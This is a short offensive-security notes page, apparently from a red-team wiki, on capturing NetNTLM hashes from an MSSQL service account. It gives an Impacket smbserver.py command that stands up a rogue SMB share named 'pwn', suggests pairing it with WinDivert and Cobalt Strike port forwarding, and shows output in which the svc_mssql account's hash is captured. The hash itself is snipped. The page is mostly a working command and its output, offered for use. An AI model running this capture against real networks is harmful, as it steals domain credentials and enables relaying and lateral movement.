
## [[SQL NetNTLM Capture]]
You may also use the WinDivert + rportfwd combo (shown on the [[NTLM Relaying#Windows - Cobalt Strike]]) with Impacket's `smbserver.py` to capture the NetNTLM hashes.
```sh
python3 /usr/local/bin/smbserver.py -smb2support pwn .

Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (127.0.0.1,46894)
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] AUTHENTICATE_MESSAGE (EDU\svc_mssql,SRV1)
[*] User SRV1\svc_mssql authenticated successfully
[*] svc_mssql::EDU:[...snip...]
[*] Connecting Share(1:pwn)
```


```meta
requirements: admin
results: 
category: 
oss: #py
source: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
description: 
```